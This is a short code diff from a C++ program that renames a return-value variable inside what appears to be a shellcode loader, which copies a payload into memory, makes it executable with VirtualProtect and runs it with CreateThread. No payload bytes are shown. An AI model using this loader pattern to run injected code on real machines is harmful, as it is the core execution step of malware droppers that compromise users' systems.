@@ -61,13 +61,13 @@ int main() {
 
     RtlMoveMemory(execMemory, payload, payloadLen);
 
-    rv = VirtualProtect(execMemory, payloadLen, PAGE_EXECUTE_READWRITE, &oldprotect);
+    returnValue = VirtualProtect(execMemory, payloadLen, PAGE_EXECUTE_READWRITE, &oldprotect);
 
     // Testing and debugging purposes
     std::cout << "Hit when ready\n";
     std::cin.get();
 
-    if (rv != 0) {
+    if (returnValue != 0) {
         thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)execMemory, 0, 0, 0);
         WaitForSingleObject(thread, INFINITE);
     } else {
